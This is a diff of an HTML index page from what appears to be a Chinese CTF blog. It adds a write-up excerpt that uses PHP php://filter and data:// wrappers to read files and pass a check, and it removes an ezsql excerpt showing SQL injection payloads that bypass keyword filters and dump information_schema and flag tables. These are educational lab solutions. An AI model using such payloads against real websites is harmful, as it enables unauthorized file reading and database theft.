@@ -131,6 +131,48 @@
 						<div class="row">
 							<div class="col-md-8">
 								<h3 class="title">
+									<a href="/2023/07/23/SWPUCTF2021-PseudoProtocols/" >SWPUCTF2021-PseudoProtocols</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-07-23
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/439">题目链接</a>  </p>
+<h2 id="页面分析"><a href="#页面分析" class="headerlink" title="页面分析"></a>页面分析</h2><p>进入页面显示<code>hint is hear Can you find out the hint.php?</code></p>
+<p>当前url为: <code>http://node2.anna.nssctf.cn:28424/index.php?wllm=</code></p>
+<h2 id="php伪协议读取hint-php"><a href="#php伪协议读取hint-php" class="headerlink" title="php伪协议读取hint.php"></a>php伪协议读取hint.php</h2><p>根据页面提示尝试</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=php:<span class="comment">//filter/convert.base64-encode/resource=hint.php</span></span><br></pre></td></tr></table></figure>
+
+<p>解码后得到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//go to /test2222222222222.php</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问 <code>http://node2.anna.nssctf.cn:28424/test2222222222222.php</code>可以得到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;max_execution_time&quot;</span>, <span class="string">&quot;180&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>= <span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>,<span class="string">&#x27;r&#x27;</span>)) === <span class="string">&#x27;I want flag&#x27;</span>)&#123;	<span class="comment"># a文件内容为&#x27;I want flag&#x27;时展示flag</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;success\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<h2 id="data伪协议构造读取"><a href="#data伪协议构造读取" class="headerlink" title="data伪协议构造读取"></a>data伪协议构造读取</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/test2222222222222.php?a=data:<span class="comment">//text/plain;base64,SSB3YW50IGZsYWc=   # base64(&#x27;I want flag&#x27;)</span></span><br></pre></td></tr></table></figure>
+
+<p>即可获取flag</p>
+
+	
+	</div>
+  <a type="button" href="/2023/07/23/SWPUCTF2021-PseudoProtocols/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
 									<a href="/2023/07/20/AFL-QEMU/" >使用 AFL++-QEMU 和 libprotobuf 的高级二进制模糊：语法感知和内存中持续模糊的实际案例</a>
 								</h3>
 							</div>
@@ -991,51 +1033,6 @@
 </div>
 
 		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/07/11/SWPUCTF2022-ezsql-wp/" >SWPUCTF2022-ezsql-wp</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-07-11
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2881">题目链接</a></p>
-<h2 id="页面内容"><a href="#页面内容" class="headerlink" title="页面内容"></a>页面内容</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">年轻的Web手啊！</span><br><span class="line">看题目名就知道你该干嘛了吧~</span><br><span class="line">用相对安全的方式传参吧</span><br><span class="line">奥对了参数是nss</span><br></pre></td></tr></table></figure>
-
-<p>参数为nss， GET发送无效； POST nss&#x3D;1发送成功  返回内容：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Flag: NSSCTF&#123;This_1s_F4ke_flag&#125;</span><br><span class="line">This is true flag: NSSCTF&#123;Ar3_y0u_K1ngd1ng&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><ul>
-<li><p>尝试联合注入</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&gt;</span> nss<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2%23</span></span><br><span class="line"><span class="string">&lt; You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;</span>select1,<span class="number">2</span>#<span class="string">&#x27; LIMIT 0,1&#x27;</span> <span class="keyword">at</span> line <span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<p>从报错可以发现空格和union被消除</p>
-<p>尝试绕过   成功</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&gt;</span> nss<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;/**/ununionion/**/select/**/1,2,3%23</span></span><br><span class="line"><span class="string">&lt; Flag: NSSCTF&#123;This_1s_F4ke_flag&#125;</span></span><br><span class="line"><span class="string">This is true flag: NSSCTF&#123;Ar3_y0u_K1ngd1ng&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 查看第二行内容</span></span><br><span class="line"><span class="string">&gt; nss=-1&#x27;</span><span class="comment">/**/</span>ununionion<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span>limit<span class="comment">/**/</span><span class="number">1</span>,<span class="number">1</span><span class="operator">%</span><span class="number">23</span></span><br><span class="line"><span class="operator">&lt;</span> Flag: <span class="number">2</span></span><br><span class="line">This <span class="keyword">is</span> <span class="literal">true</span> flag: <span class="number">3</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>接着常规流程注入</p>
-<p>注意or也会被屏蔽  所以information要更改为infoorrmation</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&gt;</span> nss<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;/**/ununionion/**/select/**/1,2,group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=database()/**/limit/**/1,1%23</span></span><br><span class="line"><span class="string">&lt; Flag: 2</span></span><br><span class="line"><span class="string">This is true flag: NSS_tb,users</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&gt; nss=-1&#x27;</span><span class="comment">/**/</span>ununionion<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,group_concat(column_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>infoorrmation_schema.columns<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_name<span class="operator">=</span><span class="string">&#x27;NSS_tb&#x27;</span><span class="comment">/**/</span>limit<span class="comment">/**/</span><span class="number">1</span>,<span class="number">1</span><span class="operator">%</span><span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="operator">&lt;</span> Flag: <span class="number">2</span></span><br><span class="line">This <span class="keyword">is</span> <span class="literal">true</span> flag: id,Secr3t,flll444g</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="operator">&gt;</span> nss<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;/**/ununionion/**/select/**/id,group_concat(Secr3t),group_concat(flll444g)/**/from/**/NSS_db.NSS_tb/**/limit/**/1,1%23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt; Flag: NSSCTF&#123;b3c1613c-6acb-46f4-9510-f3184bd69eb5&#125;</span></span><br><span class="line"><span class="string">This is true flag: NSSCTF&#123;I_d0nt_want_t0_w4ke_up&#125;</span></span><br></pre></td></tr></table></figure></li>
-</ul>
-
-	
-	</div>
-  <a type="button" href="/2023/07/11/SWPUCTF2022-ezsql-wp/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -1108,45 +1105,45 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/nodejs/">nodejs<span>3</span></a></li>
+			<li><a href="/tags/无参函数构造rce/">无参函数构造rce<span>2</span></a></li>
 		
-			<li><a href="/tags/BKP2016/">BKP2016<span>1</span></a></li>
+			<li><a href="/tags/二进制插桩/">二进制插桩<span>2</span></a></li>
 		
-			<li><a href="/tags/无字母rce/">无字母rce<span>3</span></a></li>
+			<li><a href="/tags/unserialize/">unserialize<span>12</span></a></li>
 		
-			<li><a href="/tags/QEMU/">QEMU<span>1</span></a></li>
-		
-			<li><a href="/tags/GDOUCTF2023/">GDOUCTF2023<span>3</span></a></li>
-		
-			<li><a href="/tags/AFL/">AFL<span>2</span></a></li>
-		
-			<li><a href="/tags/吃瓜杯/">吃瓜杯<span>1</span></a></li>
-		
-			<li><a href="/tags/pickle/">pickle<span>1</span></a></li>
-		
-			<li><a href="/tags/heap-overflow/">heap_overflow<span>1</span></a></li>
-		
-			<li><a href="/tags/sql/">sql<span>8</span></a></li>
-		
-			<li><a href="/tags/SSTI/">SSTI<span>6</span></a></li>
-		
-			<li><a href="/tags/HCTF2016/">HCTF2016<span>1</span></a></li>
-		
-			<li><a href="/tags/create-function/">create_function<span>2</span></a></li>
-		
-			<li><a href="/tags/reverse/">reverse<span>8</span></a></li>
+			<li><a href="/tags/网鼎杯2018/">网鼎杯2018<span>1</span></a></li>
 		
 			<li><a href="/tags/ROP/">ROP<span>1</span></a></li>
 		
+			<li><a href="/tags/libc/">libc<span>1</span></a></li>
+		
+			<li><a href="/tags/got/">got<span>3</span></a></li>
+		
+			<li><a href="/tags/SROP/">SROP<span>2</span></a></li>
+		
+			<li><a href="/tags/vtable/">vtable<span>2</span></a></li>
+		
+			<li><a href="/tags/pickle/">pickle<span>1</span></a></li>
+		
 			<li><a href="/tags/dcquals2019/">dcquals2019<span>1</span></a></li>
 		
-			<li><a href="/tags/fmt-str/">fmt_str<span>2</span></a></li>
+			<li><a href="/tags/UUCTF2022/">UUCTF2022<span>2</span></a></li>
 		
-			<li><a href="/tags/日志注入/">日志注入<span>1</span></a></li>
+			<li><a href="/tags/CISCN2019/">CISCN2019<span>1</span></a></li>
 		
-			<li><a href="/tags/malloc-hook/">__malloc_hook<span>1</span></a></li>
+			<li><a href="/tags/path-traversal/">path_traversal<span>1</span></a></li>
 		
-			<li><a href="/tags/stack-overflow/">stack_overflow<span>1</span></a></li>
+			<li><a href="/tags/SwampCTF2019/">SwampCTF2019<span>1</span></a></li>
+		
+			<li><a href="/tags/redis/">redis<span>1</span></a></li>
+		
+			<li><a href="/tags/Spring/">Spring<span>1</span></a></li>
+		
+			<li><a href="/tags/NSSCTF2022/">NSSCTF2022<span>1</span></a></li>
+		
+			<li><a href="/tags/xss/">xss<span>1</span></a></li>
+		
+			<li><a href="/tags/sql/">sql<span>8</span></a></li>
 		
 		
 		   <li><a href="/tags">...<span>120</span></a></li>
@@ -1162,6 +1159,10 @@
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2024/01/04/Shiro反序列化/" ><i class="fa fa-file-o"></i>Shiro反序列化</a>
+      </li>
+    
+      <li>
         <a href="/2023/12/28/HGAME2023-SharedDiary-wp/" ><i class="fa fa-file-o"></i>HGAME2023-SharedDiary-wp</a>
       </li>
     
@@ -1175,10 +1176,6 @@
     
       <li>
         <a href="/2023/12/13/JAVA反序列化CC3/" ><i class="fa fa-file-o"></i>JAVA反序列化CC3</a>
-      </li>
-    
-      <li>
-        <a href="/2023/12/10/JAVA反序列化CC6/" ><i class="fa fa-file-o"></i>JAVA反序列化CC6</a>
       </li>
     
   </ul>
